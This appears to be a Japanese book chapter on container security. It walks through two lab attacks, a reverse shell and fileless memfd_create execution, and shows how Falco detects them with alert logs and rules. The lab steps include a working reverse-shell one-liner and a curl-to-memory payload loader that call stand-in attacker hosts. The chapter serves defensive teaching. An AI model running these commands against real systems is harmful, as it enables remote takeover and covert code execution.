---
title: "第4章：Execution - コンテナ内部での不正実行"
---

# 第4章：Execution - コンテナ内部での不正実行

## この章で学ぶこと

- 侵入後、攻撃者がコンテナ内でどう実行環境を確保するか
- Lab 5〜6の実験手順とFalcoでの観測結果
- 「ファイルを残さない」実行手法に対する検知の強み・弱み

前章でコンテナへの足がかりを得た攻撃者は、次に**継続的に実行できる環境**を確保しようとします。本章ではMITRE ATT&CK for Containersの**Execution**戦術に対応する2本の実験を扱います。

---

## Lab 5: シェル起動・リバースシェル確立

- **MITRE ATT&CK for Containers**: T1059 (Command and Scripting Interpreter)
- **前提**: Lab 1で得た`vulnerable-webapp`内の実行コンテキストを使い、外部への接続を確立するリバースシェルを仕掛ける

```bash
# 攻撃者側（外部リスナー）
nc -lvnp 4444

# 侵害されたコンテナ内で実行
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
```

**Falcoの検知結果**:

```
18:02:44.551201000: Warning Shell spawned in container (user=www-data container=vulnerable-webapp command=bash -i)
18:02:44.552110000: Critical Reverse Shell Detected (command=bash parent=sh connection=10.0.3.12:52211->203.0.113.7:4444)
```

標準ルールの `Terminal Shell in Container` に加え、**プロセスがネットワーク接続を持ちながらシェルとして振る舞う**パターンに反応する `Reverse Shell Detected` ルールが発火します。このルールはFalcoの標準ルールセット（`falco_rules.yaml`）にデフォルトで含まれており、追加設定なしで検知できました。

```yaml
# 該当する標準ルールの骨子
- rule: Reverse Shell
  desc: シェルが外部への接続を伴って起動された
  condition: >
    spawned_process and shell_procs and
    proc.tty != 0 and
    fd.type=ipv4
  priority: CRITICAL
```

**考察**: リバースシェルは古典的な手法ですが、**「シェル」＋「ネットワーク接続」の組み合わせという振る舞いベースの検知**が有効に機能する典型例です。コマンド文字列をブロックリスト化するような検知方式では回避されやすいですが、振る舞いベースの検知は手法のバリエーション（`bash`を`python`に変えても、`nc`に変えても）に対して頑健です。

## Lab 6: ファイルレス実行（メモリ上での実行）

- **MITRE ATT&CK for Containers**: T1059.004 (Unix Shell), T1620 (Reflective Code Loading)
- **前提**: ディスクに実行ファイルを書き込まず、メモリ上に展開したバイナリを`memfd_create`経由で実行する

```bash
# ペイロードをメモリ上にのみ展開して実行（簡略化した例）
curl -s http://attacker.example/payload | python3 -c "
import ctypes, os, sys
fd = os.memfd_create('payload')
os.write(fd, sys.stdin.buffer.read())
os.execv('/proc/self/fd/%d' % fd, ['payload'])
"
```

ディスク上にファイルが存在しないため、**事後のフォレンジック調査（ファイルシステムの走査）では痕跡が残りません**。

**Falcoの検知結果**:

```
18:07:19.004512000: Critical Fileless Execution via memfd_create (command=payload fd.name=memfd:payload parent=python3)
```

Falcoは`memfd_create`というsyscall自体をフックしているため、**ディスクに書き込まれていなくても、カーネルレベルでは実行の瞬間を捉えられます**。これはFalcoの「カーネルレベル監視は改ざん・隠蔽に強い」という特性が最も分かりやすく現れる例です。

```yaml
- rule: Fileless Execution via memfd_create
  desc: memfd_create経由のファイルレス実行
  condition: >
    evt.type=execve and
    proc.exepath startswith "/proc/self/fd/" or proc.exepath contains "memfd:"
  output: >
    Fileless execution detected (command=%proc.cmdline parent=%proc.pname)
  priority: CRITICAL
```

**考察**: アプリケーションログやファイルシステムの監査では見逃されるこの手法も、**syscallレベルでは「実行」という行為そのものを隠せない**ため検知できます。これはLab 1〜4で見た「ノード内 vs APIサーバ」という境界線の話とは別の軸——**「ディスクに残る痕跡 vs カーネルが直接見る実行イベント」**という観点で、Falcoの優位性がはっきり出る実験でした。

---

## 本章のまとめ

| Lab | 手法 | Falco | 検知の鍵 |
|---|---|---|---|
| 5 | リバースシェル | ✅ 標準ルールで検知 | 「シェル」×「ネットワーク接続」の組み合わせ |
| 6 | ファイルレス実行（memfd_create） | ✅ カスタムルールで検知 | syscallレベルでの実行捕捉（ディスク痕跡に依存しない） |

Execution段階は、**本書で扱う8フェーズの中でもFalcoが最も強みを発揮する領域**であることが分かりました。次章では、侵入したコンテナの中から一歩外へ出ようとする「Privilege Escalation（権限昇格）」を扱います。
